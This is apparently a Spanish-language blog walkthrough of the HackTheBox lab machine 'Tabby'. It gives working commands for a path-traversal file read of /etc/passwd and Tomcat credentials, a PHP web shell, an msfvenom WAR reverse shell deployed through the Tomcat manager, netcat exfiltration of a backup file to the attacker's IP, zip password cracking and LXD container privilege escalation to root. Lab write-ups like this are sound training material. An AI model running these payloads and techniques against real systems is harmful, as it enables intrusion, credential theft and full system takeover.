---
layout      : post
title       : "HackTheBox - Tabby"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png
category    : [ htb ]
tags        : [ tomcat, LFI, cracking, LXD ]
---
Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema.

![tabbyHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/tabbyHTB.png)

### TL;DR (Spanish writeup)

Bueeeeno, hola, empezaremos explotando una vulnerabilidad **Local File Inclusion**, la cual usaremos para ver el archivo `tomcat-users.xml` del paquete **tomcat** en la máquina y obtener las credenciales guardadas ahí... Explotaremos por medio del apartado `/manager` del servicio **tomcat** web un rol que nos permite subir archivos, subiremos un payload que al ejecutarlo nos de una reverse Shell. Estando en la máquina encontraremos un archivo de **backup.zip** el cual crackearemos y con la password encontrada lograremos migrar al usuario **ash**. Validando los grupos del usuario **ash** veremos que está dentro de **lxd**, explotaremos el grupo y usaremos esta info para obtener una Shell como **root**.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) (por si ves mucho texto a veces)

Como siempre, tendremos 3 fases:

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración {#enumeracion}

Hacemos un escaneo de puertos con `nmap`, según la velocidad con la que vaya agregamos parámetros para hacerlo más rápido, eso si, validando que no se nos pierdan puertos.

```bash
─╼ $ nmap -p- --open -v 10.10.10.194
```

Pero va lento, agregando `-T` no cambia mucho, así que podemos usar `--min-rate`. (Sin embargo es importante hacer un escaneo total, sin cambios así vaya lento, que nos permita ver si `--min-rate` obvia algún puerto.

```bash
─╼ $ nmap -p- --open -v -Pn --min-rate=2000 10.10.10.194 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -T4        | Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos (i.e: --min-rate=5000)               |
| -Pn        | Evita que realice Host Discovery, tales como Ping (P) y DNS (n)                                          |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable, ya que uso una función que me extrae los puertos    |

```bash
─╼ $ cat initScan 
# Nmap 7.80 scan initiated Mon Oct  5 12:09:18 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.194
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.194 ()   Status: Up
Host: 10.10.10.194 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///
```

Listo, obtenemos los puertos:

* 22: SSH
* 80: Servidor web
* 8080: Proxy

Procedemos a nuestro escaneo de versiones y scripts.

```bash
─╼ $ nmap -p22,80,8080 -sC -sV 10.10.10.194 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
─╼ $ cat portScan
# Nmap 7.80 scan initiated Mon Oct  5 12:16:03 2020 as: nmap -p22,80,8080 -sC -sV -oN portScan 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Revisando cada versión con `searchsploit` no encontramos nada.

#### Puerto 80

![pagemegahosting](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagemegahosting.png)

Enumerando simplemente encontramos en el apartado `/news` que si entramos la **URL** cambia a `http://megahosting.htb/news.php?file=statement`. Por lo que debemos modificar en nuestro archivo `/etc/hosts` ese reconocimiento. Para que cuando la petición sea hacia el dominio `megahosting.htb` la resuelva la IP `10.10.10.194`.

```bash
─╼ $ cat /etc/hosts

10.10.10.194  megahosting.htb
```

Si volvemos a entrar ahora si nos permite ver el contenido:

> We apologise to all our customers for the previous data breach.
> We have changed the site to remove this tool, and have invested heavily in more secure servers

...

## Explotación {#explotacion}

Veamos la URL. Toma un argumento llamado `file`, lo que en nuestra cabeza puede significar que puede estar tomando cualquier archivo que le indiquemos... Por lo que posiblemente tengamos un **Local/Remote File Inclusion**, que nos permitiría ver e INCLUIR archivos en el sistema. Probemos ver un archivo local.

Digámosle que nos muestre el archivo `/etc/passwd`.

```html
http://megahosting.htb/news.php?file=../../../../../../etc/passwd
```

![pagepasswd](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagepasswd.png)

```bash
─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Perfecto, tenemos **Local** (vemos un usuario **ash**), probemos **Remote**. Primero creemos un archivo que nos permita ejecutar comandos en el sistema por medio de un argumento.

```bash
─╼ $ cat shxcx.php

<?php shell_exec($_GET['xmd']); ?>
```

Ahora montamos un servidor web rápidamente con python: `$ python3 -m http.server` y desde la URL le indicamos:

```html
http://megahosting.htb/news.php?file=http://10.10.15.86:8000/shxcx.php?xmd=pwd
```

Pero no obtenemos respuesta, por lo tanto nos quedaremos con el *Local File Inclusion*.

...

Podemos revisar procesos en el directorio `/proc/...` pero no tenemos nada relevante.

#### Puerto 8080

(Esta imagen se me olvido tomarla, buscando en otros writeups [la encontre perfecta acá :)](http://www.whatinfotech.com/hackthebox-tabby-writeup/))

![pagetomcat](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagetomcat.png)

Nos topamos con la página por default de **tomcat**, veamos que nos cuenta... Varias cosas interesantes:

| Descripción      | Ruta          |
| ---------------- |:------------- |
| Rules            | /usr/share/doc/tomcat9-common/RUNNING.txt.gz |
| CATALINA_HOME    | /usr/share/tomcat9                           |
| CATALINA_BASE    | /var/lib/tomcat9                             |
| Local filesystem | /var/lib/tomcat9/webapps/ROOT/index.html     |
| Users            | /etc/tomcat9/tomcat-users.xml                |

Tenemos esa "estructura" de archivos, la más interesante claramente es la que relaciona **Users**, usando el LFI para leer el contenido no obtenemos ninguno... El archivo **index.html** si nos responde, pero es la misma información que estamos viendo en la página :)

Buscando en internet indican dos cosas importantes:

* Lo más común es que el archivo `tomcat-users.xml` este dentro de la carpeta `$CATALINA_HOME/conf/`, por lo que debemos empezar a buscar ahí...
* El archivo tiene usuario y contraseña para poder entrar a los apartados **manager webapp** y **host-manager webapp**

Pero tampoco obtenemos salida. En una guia encontre que al momento de instalar tomcat necesitaremos un archivo de -servicio- y está guardado en `/etc/systemd/system/tomcat.service`, dentro del estarán las rutas que está usando **CATALINA_HOME** y **CATALINA_BASE**.

```bash
─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../etc/systemd/system/tomcat.service

[Unit]
Description=Tomcat 9 servlet container
After=network.target

[Service]
Type=forking

User=tomcat
Group=tomcat

Environment="JAVA_HOME=/usr/lib/jvm/default-java"
Environment="JAVA_OPTS=-Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true"

Environment="CATALINA_BASE=/opt/tomcat/latest"
Environment="CATALINA_HOME=/opt/tomcat/latest"
Environment="CATALINA_PID=/opt/tomcat/latest/temp/tomcat.pid"
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"

ExecStart=/opt/tomcat/latest/bin/startup.sh
ExecStop=/opt/tomcat/latest/bin/shutdown.sh

[Install]
WantedBy=multi-user.target
```

Validando sobre ese **CATALINA_HOME** tampoco vemos salida del archivo `tomcat-users.xml`. Por lo tanto lo mejor es instalar localmente **tomcat** y ver como y donde se crean los archivos para así no ir a ciegas. Pero obtenemos la misma estructura que en internet y aún ningún output.

Después de bastante tiempo intentando cosas me fui para el foro de HackThebox, una pista en la que simplemente referenciaba 

```bash
sudo apt-get install ...
find / -name...
```

Me hizo dudar si la persona que creo la máquina lo había hecho así y si esa manera creaba diferentes archivos en diferentes lados... Pues si:

```bash
─╼ $ sudo apt-get install tomcat9
─╼ $ find / -name "tomcat-users.xml"

/etc/tomcat9/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
```

Y ahora haciendo la búsqueda sobre esa nueva ruta: `/usr/share/tomcat9/etc/tomcat-users.xml` tenemos credenciales:

```bash
─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at
...
...
...
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

Listos, procedamos a validarlas

![pagehostmanager](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagehostmanager.png)

Estamos dentro, revisando el archivo `tomcat-users.xml` vemos dos roles: 

* **admin-gui**: Nos permite entrar al **/host-manager**.
* **manager-script**: Nos va a permitir jugar con scripts. Démosle un vistazo a este

Siguiendo [esta guia](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00) vemos la manera de ejecutar comandos en la máquina, podemos aprovecharnos de esto para obtener una reverse Shell. Todo pasa por que podemos subir un archivo malicioso .WAR

> En computación, un archivo WAR es un archivo JAR utilizado para distribuir una colección de JavaServer Pages, servlets, clases Java, archivos XML... [Wikipedia](https://es.wikipedia.org/wiki/WAR_(archivo))

Lo primero es generar el archivo, podemos usar `msfvenom` para ello:

> [Esta otra guia] nos explica como seria crear el archivo en vez de usar `msfvenom`

```bash
# Creamos el archivo
─╼ $ msfvenom -p java/shell_reverse_tcp lhost=10.10.15.86 lport=4433 -f war -o pwn.war

# Subimos el archivo y lo alojamos en la ruta `/foo`
─╼ $ curl -u tomcat:'$3cureP4s5w0rd123!' --upload-file pwn.war "http://10.10.10.194:8080/manager/text/deploy?path=/foo&update=true"

# Nos ponemos en escucha
─╼ $ nc -nlvp 4433

# Ejecutamos la petición
─╼ $ curl -s http://10.10.10.194:8080/foo
```

```bash
─╼ $ rlwrap nc -nlvp 4433
listening on [any] 4433 ...
connect to [10.10.15.86] from (UNKNOWN) [10.10.10.194] 38884
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
hostname
tabby
whoami
tomcat
cd /
/
script /dev/null -c bash
Script started, file is /dev/null
```

![bashtomcatshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bashtomcatshell.png)

Estamos dentro, ahora a enumerar :)

Vemos el usuario **ash** en el directorio home, pero no tenemos acceso a el. Veamos que podemos usar para obtenerlo. Buscando de que archivos es owner el usuario **tomcat** no obtenemos nada relevante... Si lo hacemos con **ash** obtenemos esto:

```bash
tomcat@tabby:/var/lib/tomcat9$ find / -user ash -ls 2>/dev/null | grep -v proc | grep -v sys
   667268      4 drwxr-xr-x   4 ash      ash          4096 Jun 17 21:59 /var/www/html/files
   655666     12 -rw-r--r--   1 ash      ash          8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
   794579      4 drwxr-x---   9 ash      ash          4096 Oct  8 21:58 /home/ash
        2      0 drwx------   6 ash      ash           180 Oct  8 19:57 /run/user/1000
```

Pasemos ese archivo `.zip` a nuestra máquina e intentemos crackearlo.

```bash
# En nuestra maquina
─╼ $ nc -lvp 4445 > 16162020_backup.zip

# En la maquina objetivo, con el `-w` le indicamos el timeout de espera
tomcat@tabby:/var/lib/tomcat9$ md5sum /var/www/html/files/16162020_backup.zip
tomcat@tabby:/var/lib/tomcat9$ nc -w 5 10.10.15.86 4445 < /var/www/html/files/16162020_backup.zip

# Despues en nuestra maquina validamos la integridad, si los dos hashes son iguales, prosigamos
─╼ $ md5sum 16162020_backup.zip
```

Ahora usamos **fcrackzip**

```bash
─╼ $ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
'var/www/html/assets/' is not encrypted, skipping
found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
'var/www/html/files/' is not encrypted, skipping
found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
checking pw arizon1                                 

PASSWORD FOUND!!!!: pw == admin@it 
```

* -v : Nos muestra el progreso de lo que va encontrando
* -u : Para que intente descomprimir el archivo apenas encuentre la contraseña
* -D : Modo diccionario
* -p : Pasamos el diccionario que usará

Listos, procedamos a ver que tenemos dentro... Pues nada importante. (Acá estuve un buen rato, enumerando y enumerando, ya que no sabía hacia donde ir).

Pues resulta que si probamos en la máquina:

```bash
tomcat@tabby:/var/lib/tomcat9$ su ash
Password: admin@it

ash@tabby:/var/lib/tomcat9$
```

Estamos dentro como el usuario **ash** :P Tenemos el flag del user.

...

## Escalada de privilegios {#escalada-de-privilegios}

Inspeccionemos O.O

Enumerando los grupos en los que esta **ash** vemos que está en el grupo **lxd**. 

```bash
ash@tabby:/dev/shm$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

De una recorde un video de [s4vitar](https://www.youtube.com/watch?v=DJydodFguU4) en el que explota este grupo... De igual forma dejo unos artículos que también explican como aprovecharse del grupo para obtener una Shell como usuario administrador.

* [Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/).
* [Ethical Hacking Guru](https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/).
* [S4vitar](https://www.youtube.com/watch?v=DJydodFguU4).

Lo primero que debemos hacer es descargar y ejecutar en nuestra máquina atacante una imagen de un contenedor, en este caso usaremos **alpine**.

```bash
─╼ $ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
─╼ $ chmod +x build-alpine
─╼ # ./build-alpine
...
─╼ # ls
alpine-v3.12-x86_64-20201007_0822.tar.gz  build-alpine
```

Nos generará la imagen y ese es el que moveremos a la máquina victima. Estando en la máquina victima haremos esto:

```bash
# Creamos el contenedor 
ash@tabby:/dev/shm$ lxc image import alpine-v3.12-x86_64-20201007_0822.tar.gz --alias alpina
ash@tabby:/dev/shm$ lxd init --auto
# Desplegamos el contenedor
ash@tabby:/dev/shm$ lxc init alpina privesc -c security.privileged=true
Creating privesc
# Le indicamos que nos haga una montura de todo el directorio raiz en la ruta `/mnt/root` 
ash@tabby:/dev/shm$ lxc config device add privesc container disk source=/ path=/mnt/root recursive=true
Device container added to privesc
# Iniciamos el contenedor
ash@tabby:/dev/shm$ lxc start privesc
# Le indicamos que nos ejecute una shell con `sh`
ash@tabby:/dev/shm$ lxc exec privesc sh
~ # whoami
root
~ # cd /mnt/root
/mnt/root # ls
bin         home        lost+found  root        swap.img
boot        lib         media       run         sys
cdrom       lib32       mnt         sbin        tmp
dev         lib64       opt         snap        usr
etc         libx32      proc        srv         var
/mnt/root #
```

Y listooooooooooooos, tenemos toda la raíz del sistema montada con el usuario **root**. 

Apenas terminemos lo nuestro, lo óptimo es borrar la imagen y el contenedor:

```bash
ash@tabby:/dev/shm$ lxc stop privesc
ash@tabby:/dev/shm$ lxc delete privesc
ash@tabby:/dev/shm$ lxc image delete alpina
```

Y tamos ganao', las flags serían estas:

![flagstabby](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/flagstabby.png)

...

Perfecto, linda maquina, el inicio fue un poco aterrador del enredo en le que estuve :P pero lo importante es no rendirse y lograrlo. La escalada de privilegios fue bonita y me recordo la hecha con docker en **Cache** :)

Bueno, te agradezco el regalarme de tu tiempo y nada, a seguir rompiendo todo <3